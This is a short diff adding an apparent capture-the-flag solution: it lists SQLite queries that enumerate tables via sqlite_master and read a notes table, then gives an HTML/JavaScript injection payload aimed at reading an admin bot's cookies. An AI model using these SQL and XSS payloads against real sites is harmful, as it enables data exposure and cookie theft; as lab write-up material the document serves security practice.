@@ -1,0 +1,11 @@
+1. Use a query like
+    SELECT `name`, `sql`   FROM `sqlite_master`   WHERE type='table';
+to find that there is a table called "notes" with one column called "note"
+
+2. SELECT note FROM notes to see the instructions:
+    submit link to admin bot at [LINK]
+    the flag is in the bot's "flag" cookie
+
+3. Submit a query such as
+    "></a><img src="x" onerror="console.log(document.cookie);"/>
+to get the bot's cookies.
